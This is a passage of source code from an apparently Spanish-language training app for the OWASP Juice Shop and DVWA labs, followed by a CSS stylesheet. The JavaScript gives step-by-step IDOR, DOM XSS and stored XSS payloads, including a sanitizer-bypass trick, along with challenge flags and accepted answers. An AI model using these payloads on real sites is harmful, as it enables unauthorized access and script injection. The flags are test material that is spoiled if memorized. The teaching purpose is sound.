            payload: 'GET /rest/basket/1',
            flag: 'FLAG{juice-idor-other-user-basket-exposed}',
            dondeEncontrarla: 'En la respuesta HTTP en Burp Suite al consultar la cesta con ID 1.',
            quePoner: 'Escribe el número de la cesta ajena que consultaste: 1',
            flagsAceptadas: ["1", "BasketId: 1", "FLAG{juice-idor-other-user-basket-exposed}"],
            objetivoFlag: 'Ingresa la flag cuando la respuesta de /rest/basket/1 te devuelva el JSON con los productos de otra cuenta, confirmando el fallo de autorizacion IDOR.'
          }
        ]
      },
      {
        id: 'juice-xss',
        numero: 5,
        titulo: 'Cross-Site Scripting en SPA',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Inyeccion en la barra de busqueda',
            como: `Donde se hace: En la barra de búsqueda de Juice Shop.

Objetivo: Ejecutar una alerta JavaScript en una aplicación moderna de página única (SPA) a través del campo de búsqueda de productos.

Paso a paso:
1. En la página principal de Juice Shop, haz clic en el icono de la lupa (barra de búsqueda).
2. Copia y pega exactamente este código:
   <iframe src="javascript:alert(\`XSS\`)">
3. Presiona la tecla Enter.
4. Aparecerá en la pantalla un cuadro de alerta emergente con el texto "XSS".

¿Por qué usamos iframe en vez de script?: En aplicaciones modernas creadas con Angular, las etiquetas <script> tradicionales suelen ser bloqueadas automáticamente por el framework, pero etiquetas como <iframe> pueden eludir estos filtros si no están bien saneadas.`,
            payload: '<iframe src="javascript:alert(`XSS`)">',
            flag: 'FLAG{juice-xss-dom-iframe-alert-fired}',
            dondeEncontrarla: 'En la alerta emergente que salta en tu navegador tras presionar Enter en la barra de búsqueda.',
            quePoner: 'Escribe el texto que aparece dentro del cuadro de alerta emergente: XSS',
            flagsAceptadas: ["XSS", "xss", "FLAG{juice-xss-dom-iframe-alert-fired}"],
            objetivoFlag: 'Ingresa la flag cuando el payload iframe dispare el alert en la barra de busqueda de Juice Shop, confirmando la vulnerabilidad DOM XSS en la SPA.'
          },
          {
            numero: 2,
            titulo: 'Inyeccion persistente en resenas de productos',
            como: `Donde se hace: En la sección de reseñas / comentarios de cualquier producto en Juice Shop.

Objetivo: Dejar un comentario con código malicioso que se active automáticamente para cualquier persona que mire el producto.

Paso a paso:
1. Con tu sesión iniciada en Juice Shop, haz clic en la foto de cualquier producto del catálogo para abrir su ficha.
2. Desplázate hacia abajo a la sección "Reviews" (Reseñas) y haz clic en el campo para escribir una nueva reseña.
3. Pega este payload diseñado para burlar el sanitizador:
   <<SCRIPT>alert("XSS");//<</SCRIPT>
4. Haz clic en el botón "Submit" para publicar el comentario.
5. Cierra la ventana y vuelve a hacer clic en el mismo producto: verás que la alerta "XSS" se ejecuta de forma persistente.

¿Por qué funcionó este truco?: El filtro eliminó la palabra <SCRIPT>, pero al haberla duplicado (<<SCRIPT>), al borrar la primera quedó una etiqueta válida de apertura que el navegador ejecutó.`,
            payload: '<<SCRIPT>alert("XSS");//<</SCRIPT>',
            flag: 'FLAG{juice-xss-stored-review-persists}',
            dondeEncontrarla: 'En la sección de Reviews de un producto en Juice Shop tras recargar la página.',
            quePoner: 'Escribe el texto de la alerta ejecutada desde la reseña: XSS',
            flagsAceptadas: ["XSS", "xss", "FLAG{juice-xss-stored-review-persists}"],
            objetivoFlag: 'Ingresa la flag cuando al volver a la pagina del producto (o recargarla) el alert "XSS" se dispare automaticamente desde la resena guardada en la base de datos.'
          }
        ]
      }
    ]
  }
};

export const RUTA_GLOBAL_TEMATICAS = [
  {
    orden: 1,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'juice-recon',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-recon',
    titulo: 'Busqueda de Rutas y Secciones Ocultas',
    categoria: 'Reconocimiento',
    nivel: 'Basico',
    descripcion: 'Aprenderas a revisar el codigo fuente de una pagina para descubrir enlaces ocultos y desbloquear el panel oficial de retos del laboratorio.',
    duracionEstimada: '10 min',
    tags: ['Recon', 'Rutas Ocultas', 'Score Board'],
  },
  {
    orden: 2,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'dvwa-brute-force',
    lab: 'DVWA',
    moduloId: 'dvwa-brute-force',
    titulo: 'Pruebas Automaticas de Contrasenas',
    categoria: 'Autenticacion',
    nivel: 'Basico',
    descripcion: 'Entendras como se prueban miles de contrasenas de forma automatica con programas como Hydra y por que es vital usar claves seguras.',
    duracionEstimada: '15 min',
    tags: ['Hydra', 'Fuerza Bruta', 'Cookies de Sesion'],
  },
  {
    orden: 3,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'dvwa-xss-reflected',
    lab: 'DVWA',
    moduloId: 'dvwa-xss-reflected',
    titulo: 'Inyeccion de Codigo en Formularios (XSS)',
    categoria: 'Inyeccion Web (XSS)',
    nivel: 'Basico',
    descripcion: 'Aprenderas que ocurre cuando una pagina no revisa lo que escribe el usuario, permitiendo que se ejecute codigo no autorizado en el navegador.',
    duracionEstimada: '15 min',
    tags: ['XSS Reflected', 'JavaScript Injection', 'document.cookie'],
  },
  {
    orden: 4,
    fase: 1,
    faseTitulo: 'Fase 1 · Autenticacion y Reconocimiento',
    faseNivel: 'Basico',
    faseIcono: 'lock',
    id: 'juice-sqli',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-sqli',
    titulo: 'Entrada sin Contrasena (Inyeccion SQL Basica)',
    categoria: 'Inyeccion SQL',
    nivel: 'Basico',
    descripcion: 'Descubriras como un fallo al consultar la base de datos permite iniciar sesion en la cuenta del administrador sin saber su contrasena.',
    duracionEstimada: '15 min',
    tags: ['SQL Injection', 'Auth Bypass', 'API REST', 'SQLite'],
  },
  {
    orden: 5,
    fase: 2,
    faseTitulo: 'Fase 2 · Vulnerabilidades en Servidor y Backend',
    faseNivel: 'Intermedio',
    faseIcono: 'server',
    id: 'dvwa-command-injection',
    lab: 'DVWA',
    moduloId: 'dvwa-command-injection',
    titulo: 'Control del Servidor mediante Comandos',
    categoria: 'Command Injection',
    nivel: 'Intermedio',
    descripcion: 'Aprenderas como un formulario mal protegido puede ser manipulado para ejecutar ordenes del sistema directamente en el servidor.',
    duracionEstimada: '20 min',
    tags: ['OS Commands', 'Linux Shell', 'Concatenacion ;'],
  },
  {
    orden: 6,
    fase: 2,
    faseTitulo: 'Fase 2 · Vulnerabilidades en Servidor y Backend',
    faseNivel: 'Intermedio',
    faseIcono: 'server',
    id: 'dvwa-sqli',
    lab: 'DVWA',
    moduloId: 'dvwa-sqli',
    titulo: 'Extraccion de Usuarios y Claves Guardadas',
    categoria: 'Inyeccion SQL',
    nivel: 'Intermedio',
    descripcion: 'Aprenderas a consultar informacion privada en la base de datos, obteniendo los nombres de los usuarios y sus contrasenas.',
    duracionEstimada: '25 min',
    tags: ['UNION SELECT', 'ORDER BY', 'MySQL Hash Dump'],
  },
  {
    orden: 7,
    fase: 2,
    faseTitulo: 'Fase 2 · Vulnerabilidades en Servidor y Backend',
    faseNivel: 'Intermedio',
    faseIcono: 'server',
    id: 'dvwa-fi',
    lab: 'DVWA',
    moduloId: 'dvwa-fi',
    titulo: 'Lectura de Archivos Confidenciales (LFI)',
    categoria: 'Inclusion de Archivos',
    nivel: 'Intermedio',
    descripcion: 'Veras como explorar las carpetas internas del servidor a traves de la direccion web para leer archivos que deberian ser secretos.',
    duracionEstimada: '20 min',
    tags: ['LFI', 'Directory Traversal', 'php://filter'],
  },
  {
    orden: 8,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'dvwa-xss-stored',
    lab: 'DVWA',
    moduloId: 'dvwa-xss-stored',
    titulo: 'Codigo Malicioso Permanente (XSS Almacenado)',
    categoria: 'Inyeccion Web (XSS)',
    nivel: 'Intermedio',
    descripcion: 'Entendras el peligro de guardar comentarios con codigo malicioso que se activa automaticamente cada vez que alguien visita la pagina.',
    duracionEstimada: '20 min',
    tags: ['XSS Stored', 'Persistencia', 'Bypass HTML Client-Side'],
  },
  {
    orden: 9,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'juice-logic',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-logic',
    titulo: 'Modificacion de Precios y Carrito de Compras',
    categoria: 'Logica de Negocio',
    nivel: 'Intermedio',
    descripcion: 'Descubriras como alterar los datos que envia la tienda en segundo plano para cambiar cantidades o conseguir productos gratis.',
    duracionEstimada: '15 min',
    tags: ['Business Logic', 'Manipulacion JSON', 'Burp Repeater'],
  },
  {
    orden: 10,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'juice-idor',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-idor',
    titulo: 'Acceso a Datos de Otras Cuentas (IDOR)',
    categoria: 'Control de Acceso (IDOR)',
    nivel: 'Intermedio',
    descripcion: 'Aprenderas como cambiar un simple numero en la URL para acceder a las cestas y compras de otros usuarios sin autorizacion.',
    duracionEstimada: '15 min',
    tags: ['IDOR', 'Bypass de Autorizacion', 'REST Endpoint'],
  },
  {
    orden: 11,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'juice-xss',
    lab: 'OWASP Juice Shop',
    moduloId: 'juice-xss',
    titulo: 'Ataques al Navegador en Aplicaciones Modernas',
    categoria: 'Inyeccion Web (XSS)',
    nivel: 'Intermedio',
    descripcion: 'Veras como manipular la interfaz visual de una aplicacion moderna para que ejecute acciones invisibles sin que el usuario se de cuenta.',
    duracionEstimada: '20 min',
    tags: ['DOM XSS', 'SPA Injection', 'Iframe Attack'],
  },
  {
    orden: 12,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'dvwa-upload',
    lab: 'DVWA',
    moduloId: 'dvwa-upload',
    titulo: 'Subida de Archivos y Control del Servidor',
    categoria: 'File Upload / RCE',
    nivel: 'Intermedio',
    descripcion: 'Comprenderas el riesgo de permitir subida de archivos sin verificar su contenido y como un archivo PHP otorga control total del servidor.',
    duracionEstimada: '25 min',
    tags: ['Web Shell', 'Unrestricted File Upload', 'RCE'],
  },
  {
    orden: 13,
    fase: 3,
    faseTitulo: 'Fase 3 · Logica de Negocio y Explotacion Avanzada',
    faseNivel: 'Intermedio',
    faseIcono: 'shield-alert',
    id: 'dvwa-csrf',
    lab: 'DVWA',
    moduloId: 'dvwa-csrf',
    titulo: 'Acciones Forzadas en Cuentas Ajenas (CSRF)',
    categoria: 'Ataques de Sesion (CSRF)',
    nivel: 'Intermedio',
    descripcion: 'Entendras como una pagina trampa puede obligar al navegador de una victima a cambiar su contrasena sin su consentimiento.',
    duracionEstimada: '20 min',
    tags: ['CSRF', 'Session Hijacking', 'Exploit HTML'],
  },
];

export function obtenerRoadmapLab(nombreLab) {
  return ROADMAP_MODULOS[nombreLab] || null;
}

export function obtenerEstadisticasLab(nombreLab, modulos) {
  if (!modulos || modulos.length === 0) {
    return { totalModulos: 0, modulosCompletados: 0, totalPasos: 0, pasosCompletados: 0, porcentaje: 0 };
  }
  let totalPasos = 0;
  let pasosCompletados = 0;
  let modulosCompletados = 0;
  modulos.forEach((mod) => {
    const cantPasos = mod.pasos?.length || 0;
    totalPasos += cantPasos;
    const guardados = obtenerPasosCompletadosModulo(nombreLab, mod.id);
    pasosCompletados += guardados.length;
    if (cantPasos > 0 && guardados.length === cantPasos) {
      modulosCompletados += 1;
    }
  });
  const porcentaje = totalPasos > 0 ? Math.round((pasosCompletados / totalPasos) * 100) : 0;
  return { totalModulos: modulos.length, modulosCompletados, totalPasos, pasosCompletados, porcentaje };
}

const STORAGE_KEY_PREFIX = 'roadmap_pasos_completados_';

export function obtenerPasosCompletadosModulo(nombreLab, moduloId) {
  try {
    const key = `${STORAGE_KEY_PREFIX}${nombreLab}_${moduloId}`;
    const raw = localStorage.getItem(key);
    return raw ? JSON.parse(raw) : [];
  } catch {
    return [];
  }
}

export function alternarPasoModulo(nombreLab, moduloId, pasoIdx) {
  try {
    const key = `${STORAGE_KEY_PREFIX}${nombreLab}_${moduloId}`;
    const actuales = obtenerPasosCompletadosModulo(nombreLab, moduloId);
    let nuevos;
    if (actuales.includes(pasoIdx)) {
      nuevos = actuales.filter((i) => i !== pasoIdx);
    } else {
      nuevos = [...actuales, pasoIdx].sort((a, b) => a - b);
    }
    localStorage.setItem(key, JSON.stringify(nuevos));
    return nuevos;
  } catch {
    return [];
  }
}

``

### Archivo: `frontend/src/App.css`
``css
:root {
  --bg: #0b0d0f;
  --superficie: #13161a;
  --superficie-alt: #181c22;
  --borde: #222730;
  --borde-hover: #333a47;
  --texto: #f0f2f5;
  --texto-muted: #8b93a0;
  --acento: #00e08a;
  --acento-suave: rgba(0, 224, 138, 0.1);
  --acento2: #38bdf8;
  --peligro: #f87171;
  --fuente-display: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
  --fuente-body: 'Inter', system-ui, -apple-system, sans-serif;
  --fuente-mono: 'JetBrains Mono', monospace;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background: var(--bg);
  color: var(--texto);
  font-family: var(--fuente-body);
  -webkit-font-smoothing: antialiased;
}

button {
  font-family: inherit;
}

/* ---------- Utilidad: página que usa todo el ancho ---------- */

.pagina-fluida {
  width: 100%;
  padding: 40px clamp(24px, 5vw, 72px) 72px;
}

.etiqueta-comentario {
  display: inline-block;
  font-family: 'JetBrains Mono', monospace;
  font-size: 12px;
  color: var(--acento);
  margin-bottom: 10px;
}

/* ---------- Shell de la app (navbar + contenido) ---------- */

.app-shell {
  min-height: 100vh;
  background-image:
    linear-gradient(#151719 1px, transparent 1px),
    linear-gradient(90deg, #151719 1px, transparent 1px);
  background-size: 48px 48px;
}

.app-main {
  animation: aparecer 0.25s ease;
}

@keyframes aparecer {
  from {
    opacity: 0;
    transform: translateY(6px);
  }

  to {
    opacity: 1;
    transform: translateY(0);
  }
}

/* ---------- Navbar persistente ---------- */

.navbar {
  position: sticky;
  top: 0;
  z-index: 20;
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 24px;
  padding: 16px clamp(24px, 5vw, 72px);
  background: rgba(13, 15, 17, 0.85);
  backdrop-filter: blur(10px);
  border-bottom: 1px solid var(--borde);
}

.navbar-logo {
  background: none;
  border: none;
  color: var(--texto);
  font-family: 'JetBrains Mono', monospace;
  font-size: 14px;
  font-weight: 600;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 6px;
  white-space: nowrap;
}

.navbar-logo-icono {
  color: var(--acento);
}

.navbar-logo:hover .navbar-logo-icono {
  text-shadow: 0 0 10px var(--acento);
}

.navbar-links {
  display: flex;
  gap: 4px;
  flex: 1;
  justify-content: center;
}

.navbar-link {
  position: relative;
  background: none;
  border: none;
  color: var(--texto-muted);
  font-size: 14px;
  padding: 8px 16px;
  cursor: pointer;
}

.navbar-link::after {
  content: '';
  position: absolute;
  left: 16px;
  right: 16px;
  bottom: 2px;
  height: 2px;
  background: var(--acento);
  transform: scaleX(0);
  transition: transform 0.2s ease;
}

.navbar-link:hover {
  color: var(--texto);
}

.navbar-link:hover::after {
  transform: scaleX(1);
}

.navbar-link-activo {
  color: var(--acento);
  font-weight: 600;
}

.navbar-link-activo::after {
  transform: scaleX(1);
}

.navbar-ip {
  display: flex;
  align-items: center;
  gap: 8px;
  font-size: 12px;
  color: var(--texto-muted);
  white-space: nowrap;
}

.navbar-ip-texto {
  font-family: 'JetBrains Mono', monospace;
}

.navbar-ip-cambiar {
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  color: var(--texto-muted);
  font-size: 12px;
  padding: 5px 10px;
  border-radius: 6px;
  cursor: pointer;
  transition: border-color 0.15s, color 0.15s;
}

.navbar-ip-cambiar:hover {
  border-color: var(--acento);
  color: var(--acento);
}

.punto-estado {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: var(--acento);
  box-shadow: 0 0 8px var(--acento);
  flex-shrink: 0;
}

@media (max-width: 720px) {
  .navbar {
    flex-wrap: wrap;
  }

  .navbar-links {
    order: 3;
    width: 100%;
    justify-content: flex-start;
  }
}

/* ---------- Formulario de IP (Conexión Pi Node) ---------- */

.pantalla-centrada {
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 24px;
  background-image:
    radial-gradient(circle at 50% 10%, rgba(0, 224, 138, 0.05), transparent 40%),
    linear-gradient(#15181c 1px, transparent 1px),
    linear-gradient(90deg, #15181c 1px, transparent 1px);
  background-size: 100% 100%, 48px 48px, 48px 48px;
}

.tarjeta-formulario-pro {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 12px;
  padding: 36px 32px;
  width: 100%;
  max-width: 480px;
  box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
}

.formulario-header {
  margin-bottom: 24px;
  text-align: left;
}

.formulario-nodo-tag {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 700;
  color: var(--acento);
  letter-spacing: 0.5px;
  margin-bottom: 12px;
}

.node-indicator {
  width: 7px;
  height: 7px;
  border-radius: 50%;
  background: var(--acento);
  box-shadow: 0 0 8px var(--acento);
}

.formulario-titulo {
  font-family: var(--fuente-display);
  font-size: 24px;
  font-weight: 700;
  color: #ffffff;
  letter-spacing: -0.3px;
  margin-bottom: 8px;
}

.formulario-subtitulo {
  font-size: 13px;
  color: var(--texto-muted);
  line-height: 1.5;
}

.formulario-cuerpo {
  display: flex;
  flex-direction: column;
  gap: 16px;
}

.campo-ip-wrapper {
  display: flex;
  align-items: center;
  background: #090b0d;
  border: 1px solid var(--borde);
  border-radius: 8px;
  padding: 4px 12px;
  transition: border-color 0.2s, box-shadow 0.2s;
}

.campo-ip-wrapper:focus-within {
  border-color: var(--acento);
  box-shadow: 0 0 0 1px var(--acento);
}

.campo-ip-prefijo,
.campo-ip-sufijo {
  font-family: var(--fuente-mono);
  font-size: 13px;
  color: var(--texto-muted);
  user-select: none;
}

.input-ip-pro {
  flex: 1;
  background: transparent;
  border: none;
  outline: none;
  color: #ffffff;
  font-family: var(--fuente-mono);
  font-size: 14px;
  padding: 10px 8px;
}

.input-ip-pro::placeholder {
  color: #4b5563;
}

.formulario-sugerencias {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
}

.sugerencias-label {
  font-size: 11px;
  color: var(--texto-muted);
  font-family: var(--fuente-mono);
}

.sugerencias-lista {
  display: flex;
  gap: 6px;
  flex-wrap: wrap;
}

.btn-sugerencia-ip {
  background: var(--superficie-alt);
  border: 1px solid var(--borde);
  color: var(--texto-muted);
  font-family: var(--fuente-mono);
  font-size: 11px;
  padding: 3px 8px;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.15s ease;
}

.btn-sugerencia-ip:hover {
  color: var(--texto);
  border-color: #3b424f;
}

.btn-conectar-pro {
  width: 100%;
  padding: 12px;
  font-family: var(--fuente-display);
  font-size: 14px;
  font-weight: 600;
  border-radius: 8px;
}

.formulario-footer {
  margin-top: 20px;
  padding-top: 16px;
  border-top: 1px solid var(--borde);
}

.footer-nota {
  display: block;
  font-size: 11px;
  color: #64748b;
  line-height: 1.4;
  text-align: left;
}

/* ---------- Botones ---------- */

.btn {
  border: none;
  border-radius: 6px;
  padding: 10px 18px;
  font-size: 13px;
  font-weight: 500;
  cursor: pointer;
  transition: opacity 0.15s, transform 0.1s, box-shadow 0.2s;
}

.btn:hover:not(:disabled) {
  transform: translateY(-1px);
}

.btn:active:not(:disabled) {
  transform: scale(0.97);
}

.btn:disabled {
  opacity: 0.35;
  cursor: not-allowed;
}

.btn-primario {
  background: var(--acento);
  color: #06110c;
  font-weight: 600;
}

.btn-primario:hover:not(:disabled) {
  box-shadow: 0 0 0 4px var(--acento-suave);
}

.btn-secundario {
  background: transparent;
  color: var(--texto);
  border: 1px solid var(--borde);
}

.btn-secundario:hover {
  border-color: var(--acento);
  color: var(--acento);
}

.btn-icono {
  background: var(--superficie-alt);
  color: #d1d5db;
  border: 1px solid var(--borde);
}

.btn-encender:hover {
  color: var(--acento);
  border-color: var(--acento);
}

.btn-apagar:hover {
  color: var(--peligro);
  border-color: var(--peligro);
}

.btn-volver {
  margin-bottom: 24px;
}

/* ---------- Grilla de laboratorios ---------- */

/*
  La grilla usa --lab-count (inyectado desde JSX) para calcular el min
  de columna de forma dinámica: con 1-2 labs las tarjetas son enormes;
  con más labs el mínimo baja y caben más columnas.
  Fórmula: min = max(240px, 80vw / sqrt(n))
  Simulado con clamp() por compatibilidad.
*/
.grid-labs {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(min(100%, clamp(260px, calc(85vw / max(1, var(--lab-count, 2))), 560px)), 1fr));
  gap: 24px;
  align-items: start;
}

/* ---- Tarjeta ---- */
.cuadro-lab {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 16px;
  overflow: hidden;
  display: flex;
  flex-direction: column;
  cursor: pointer;
  text-align: left;
  padding: 24px;
  gap: 16px;
  transition: border-color 0.2s, transform 0.18s, box-shadow 0.2s, background-color 0.2s;
}

.cuadro-lab:hover {
  border-color: var(--acento);
  background: var(--superficie-alt);
  transform: translateY(-4px);
  box-shadow: 0 16px 32px rgba(0, 0, 0, 0.35), 0 0 0 1px var(--acento-suave);
}

/* ---- Icon Header ---- */
.cuadro-lab-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  width: 100%;
}

.cuadro-lab-icono-box {
  width: 48px;
  height: 48px;
  border-radius: 12px;
  background: var(--acento-suave);
  border: 1px solid rgba(0, 224, 138, 0.2);
  color: var(--acento);
  display: flex;
  align-items: center;
  justify-content: center;
  transition: transform 0.2s ease, border-color 0.2s;
}

.cuadro-lab:hover .cuadro-lab-icono-box {
  transform: scale(1.05);
  border-color: var(--acento);
}

.cuadro-lab-svg {
  width: 26px;
  height: 26px;
}

.cuadro-lab-tags {
  display: flex;
  align-items: center;
  gap: 8px;
}

.cuadro-lab-nivel-badge {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 600;
  color: rgba(255, 255, 255, 0.7);
  background: rgba(255, 255, 255, 0.06);
  border: 1px solid var(--borde);
  padding: 3px 10px;
  border-radius: 20px;
}

/* ---- Contenido ---- */
.cuadro-lab-content {
  display: flex;
  flex-direction: column;
  gap: 6px;
  flex: 1;
}

.cuadro-lab-cat {
  font-family: var(--fuente-mono);
  font-size: 11px;
  font-weight: 600;
  color: var(--acento2);
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.cuadro-lab-nombre {
  font-size: 20px;
  font-weight: 700;
  color: #ffffff;
  margin: 0;
  line-height: 1.25;
}

.cuadro-lab-mini {
  font-size: 13.5px;
  color: var(--texto-muted);
  line-height: 1.55;
  margin: 4px 0 0;
}

.cuadro-lab-footer {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding-top: 14px;
  border-top: 1px solid var(--borde);
  margin-top: auto;
}

.cuadro-modulos-count {
  font-family: var(--fuente-mono);
  font-size: 12px;
  color: var(--texto-muted);
  display: flex;
  align-items: center;
}

.cuadro-ver-roadmap {
  font-family: var(--fuente-mono);
  font-size: 12px;
  font-weight: 600;
  color: var(--acento);
  transition: transform 0.15s ease;
}

.cuadro-lab:hover .cuadro-ver-roadmap {
  transform: translateX(3px);
}

.badge-estado {
  display: inline-block;
  width: fit-content;
  font-size: 11px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  padding: 3px 10px;
  border-radius: 20px;
}

.badge-running {
  background: var(--acento-suave);
  color: var(--acento);
}

.badge-exited {
  background: rgba(139, 146, 156, 0.15);
  color: var(--texto-muted);
}

/* ---------- Detalle de laboratorio ---------- */

.detalle-grid {
  display: grid;
  grid-template-columns: 320px 1fr;
  gap: 48px;
  align-items: start;
}

.detalle-titulo {
  font-family: 'JetBrains Mono', monospace;
  font-size: 28px;
  margin-bottom: 12px;
}

.detalle-col-info .badge-estado {
  margin-bottom: 28px;
}

.detalle-acciones {
  display: flex;
  flex-direction: column;
  gap: 10px;
}

.detalle-descripcion {
  color: var(--texto-muted);
  font-size: 15px;
  line-height: 1.6;
  margin-bottom: 28px;
  max-width: 60ch;
}

.terminal-guia {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 8px;
  padding: 20px 22px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  line-height: 2.1;
}

.terminal-guia .terminal-prompt {
  color: var(--acento);
  margin-right: 8px;
}

@media (max-width: 800px) {
  .detalle-grid {
    grid-template-columns: 1fr;
  }
}

/* ---------- Roadmap ---------- */

.roadmap {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
  gap: 20px;
}

.roadmap-fila {
  display: contents;
}

.roadmap-nodo {
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-left: 3px solid var(--borde);
  border-radius: 10px;
  padding: 22px;
  text-align: left;
  transition: border-color 0.2s, transform 0.15s;
}

.roadmap-nodo:hover {
  transform: translateY(-3px);
}

.nodo-instalado {
  border-left-color: var(--acento);
}

.nodo-instalado:hover {
  border-color: var(--acento);
}

.nodo-pendiente {
  opacity: 0.5;
}

.roadmap-nivel {
  display: inline-block;
  font-family: 'JetBrains Mono', monospace;
  font-size: 11px;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  color: var(--acento);
  background: var(--acento-suave);
  padding: 3px 10px;
  border-radius: 20px;
  margin-bottom: 12px;
}

.roadmap-nombre {
  font-size: 17px;
  margin-bottom: 8px;
}

.roadmap-descripcion {
  font-size: 13px;
  color: var(--texto-muted);
  margin-bottom: 16px;
  line-height: 1.5;
}

.roadmap-pendiente-texto {
  font-size: 12px;
  color: #5a6068;
  font-style: italic;
}

.roadmap-linea {
  display: none;
}

/* ---------- Landing (Home Profesional & Atractivo) ---------- */

.landing {
  min-height: 100vh;
  position: relative;
  overflow: hidden;
  padding-bottom: 90px;
  background-color: var(--bg);
  background-image:
    radial-gradient(circle at 50% 0%, rgba(0, 224, 138, 0.07), transparent 50%),
    linear-gradient(#15181c 1px, transparent 1px),
    linear-gradient(90deg, #15181c 1px, transparent 1px);
  background-size: 100% 100%, 48px 48px, 48px 48px;
}

.landing-fondo {
  position: absolute;
  inset: 0;
  height: 900px;
  mask-image: radial-gradient(circle at 50% 10%, black, transparent 70%);
  background: radial-gradient(circle at 50% 10%, rgba(0, 224, 138, 0.08), transparent 60%);
  pointer-events: none;
}

.landing-luz-ambiente {
  position: absolute;
  top: -120px;
  left: 50%;
  transform: translateX(-50%);
  width: 600px;
  height: 350px;
  background: radial-gradient(ellipse at center, rgba(56, 189, 248, 0.12), rgba(0, 224, 138, 0.08), transparent 70%);
  filter: blur(60px);
  pointer-events: none;
  animation: pulso-ambiente 8s ease-in-out infinite alternate;
}

@keyframes pulso-ambiente {
  from {
    opacity: 0.6;
    transform: translateX(-50%) scale(0.95);
  }

  to {
    opacity: 1;
    transform: translateX(-50%) scale(1.05);
  }
}

/* ---------- Landing Topbar & Menú Hamburguesa ---------- */

.landing-topbar {
  position: relative;
  z-index: 30;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 16px clamp(20px, 4vw, 48px);
  background: rgba(11, 13, 15, 0.7);
  backdrop-filter: blur(12px);
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

.landing-topbar-logo {
  display: flex;
  align-items: center;
  gap: 8px;
  font-family: var(--fuente-mono);
  font-size: 14px;
  font-weight: 700;
  color: #ffffff;
  letter-spacing: 0.3px;
}

.topbar-logo-svg {
  color: var(--acento);
}

.landing-topbar-acciones {
  display: flex;
  align-items: center;
  gap: 14px;
}

.topbar-ip-badge {
  display: flex;
  align-items: center;
  gap: 6px;
  background: var(--superficie);
  border: 1px solid var(--borde);
  padding: 4px 10px;
  border-radius: 6px;
  font-family: var(--fuente-mono);
  font-size: 11.5px;
  color: #e2e8f0;
}

.topbar-ip-dot {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: var(--acento);
  box-shadow: 0 0 6px var(--acento);
}

.topbar-btn-sin-ip {
  display: flex;
  align-items: center;
  gap: 6px;
  background: rgba(255, 255, 255, 0.04);
  border: 1px solid var(--borde);
  color: var(--texto-muted);
  font-family: var(--fuente-mono);
  font-size: 11px;
  padding: 4px 10px;
  border-radius: 6px;
  cursor: pointer;
  transition: all 0.15s ease;
}

.topbar-btn-sin-ip:hover {
  border-color: var(--acento);
  color: var(--texto);
}

.topbar-ip-dot-off {
  width: 6px;
  height: 6px;
  border-radius: 50%;
  background: #64748b;
}

/* Botón Hamburguesa */
.btn-hamburguesa {
  width: 38px;
  height: 38px;
  background: var(--superficie);
  border: 1px solid var(--borde);
  border-radius: 8px;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  gap: 5px;
  cursor: pointer;
  padding: 0;
  transition: all 0.2s ease;
}

.btn-hamburguesa:hover {
  border-color: var(--acento);
  background: var(--superficie-alt);
}

.hamb-linea {
  width: 18px;
  height: 2px;
  background: #f1f5f9;
  border-radius: 2px;
  transition: all 0.25s ease;
}

.hamburguesa-activa .hamb-1 {
  transform: translateY(7px) rotate(45deg);
}

.hamburguesa-activa .hamb-2 {
  opacity: 0;
  transform: scaleX(0);
